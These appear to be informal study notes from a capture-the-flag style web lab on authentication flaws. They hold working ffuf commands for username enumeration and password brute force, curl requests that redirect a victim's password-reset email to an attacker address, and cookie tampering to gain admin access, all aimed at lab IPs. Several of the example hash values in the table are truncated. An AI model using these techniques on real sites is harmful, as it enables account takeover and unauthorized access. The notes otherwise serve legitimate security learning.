1st
aunthentication vulnerabilities = creating a list of valid usernames

website error messages are great for getting info of valid usernames

we get error -> can get valid info using fuff
Ex:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.68.168/customers/signup -mr "username already exists"

-w = selects file location
-x = specifies request method, default is GET request in ex is post
-d = specifies data being sent
     in ex we have usern,email,passwords and cpassword.
     value of usern is fuzz, in fuff tool fuzz signifies where content from wordlist will be inserted in request
-h = used for adding more headers to request
     in ex setting content-type so webserver knows we are sending form data
-u = specifies url we are making request to 
-mr = is text on page we are looking for to validate we found a valid username
=====================
this area reveals valid usernames
=====================
-------------
2nd
brute force attack = automated process tries a list of common passwo againt single usernames or a list of em
*****************
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.205.70/customers/login -fc 200
******************
since we use muiltiple wordlist we have to specify our own fuzz keyword
in ex we choose 
w1 = for our list of valid usernames 
w2 = for list of passwords we will try
-w = muiltiple wodlist are specified using this but with ","
-fc = for a positive match use this to check for an http status code other than 200
============
once put valid usernames in a file named valid_user.txt it goes through each username and look for valid passwords that match
============
3rd
-------------------------------------------------------------
logic flaw = when the typical logic path of an appllication is either bypassed, circumvented or manipulated by a hacker
logic flaw can exist anywhere in website
authentication process may contain logic flaws

python "===" its looking for exact match on string including the same letter casing 

the hacker path will take you from step one to step two
rather than taking the intended path going step by step 

curl 'http://10.10.24.6/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
-h = add aditional header to the request

content-type = application/x-www-form-urlencoded
lets webserver know we are sending data so it understands the request
---
-user account is retrieved using query string 
-later then the password reset email is sent using the data found
found in php variable $_REQUEST

- PHP $_REQUEST variable = array that contains data recieved from the query string and post data 

 If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string
if we add another parameter to the POST form, we can control where the password reset email gets delivered.

 curl 'http://10.10.24.6/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

then create our own account then run

curl 'http://10.10.24.6/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm'
this will give us the link to reset roberts account
-----------------------
4th
cookies = something that doesnt keep track of data but has a reminder of the data
just like when logging into a website and not having to log in

examining/editing cookies set on webserver, can have muiltiple outcomes
- unauthenticated access
- access to another user account 
- elevated privileges

first start by requesting the target page
curl http://10.10.159.221/cookie-test

send another request with logged_in cookie set to true and admin cookie set to false
curl -H "Cookie: logged_in=true; admin=false" http://10.10.159.221/cookie-test

send one last request setting both the logged_in and admin cookie to true
curl -H "Cookie: logged_in=true; admin=true" http://10.10.159.221/cookie-test

HASHING
cookie values = look like a long string at times called hashers = are irreversible representation of original text

original string   hash method 			output
 	1		md5			c4ca4238a0b923820dc
	1		sha256		6b86b273ff34fce19d6b804eff5a3f5747ada
	1		sha 512		4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89
	1		SHA1 		356a192b7913b04c54574d
-------------------------------
encoding = is similar to hashing it creates a ransom string of text but encoding is reversible

encoding allows us to convert binary to human readable text and can be easily safely transmitted in ascii txt
encoding types
base 32 convert binary data to character A-Z and 2-7
base 64 converts using characters a-z A-Z 0-9 + / and equal sign for padding 

finding the value of md5 use 		crackstation
base64 decode values			decode and encode base64
same for base64 encoding



